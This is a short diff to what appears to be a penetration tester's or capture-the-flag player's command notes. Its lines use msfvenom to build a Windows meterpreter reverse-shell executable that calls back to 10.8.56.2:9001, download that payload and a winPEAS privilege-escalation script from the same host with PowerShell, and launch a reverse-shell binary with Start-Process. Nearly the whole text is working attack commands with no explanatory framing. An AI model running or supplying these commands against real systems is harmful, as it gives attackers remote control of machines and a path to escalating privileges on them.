@@ -36,3 +36,11 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.56.2/c2.
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.56.2/revshell9001exit.exe','revshell9001exit.exe')"
 
 Start-Process "revshell9001exit.exe"
+
+
+# Payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.56.2 LPORT=9001 -f exe > reverseshell9001.exe
+powershell Invoke-WebRequest -Uri http://10.8.56.2/reverseshell9001.exe -Outfile reverseshell9001.exe
+
+# winPEAS.bat
+powershell Invoke-WebRequest -Uri http://10.8.56.2/winPEAS.bat -Outfile winPEAS.bat
